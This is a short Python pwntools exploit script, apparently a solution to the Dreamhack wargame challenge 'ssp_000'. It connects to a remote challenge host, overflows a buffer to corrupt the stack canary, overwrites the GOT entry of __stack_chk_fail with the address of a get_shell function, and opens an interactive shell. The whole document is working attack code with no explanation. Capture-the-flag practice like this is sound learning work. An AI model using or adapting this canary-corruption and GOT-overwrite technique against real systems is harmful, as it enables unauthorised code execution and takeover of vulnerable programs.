from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/ssp_000')
else:
    r = remote('host2.dreamhack.games', 19808)

__stack_chk_fail_got = 0x601020 # GOT of __stack_chk_fail()
get_shell = 0x4008ea # get_shell()

# corrupt canary
r.send('a' * 0x50)

# overwrite GOT of __stack_chk_fail() with get_shell()
r.sendlineafter('Addr : ', str(__stack_chk_fail_got))
r.sendlineafter('Value : ', str(get_shell))

r.interactive()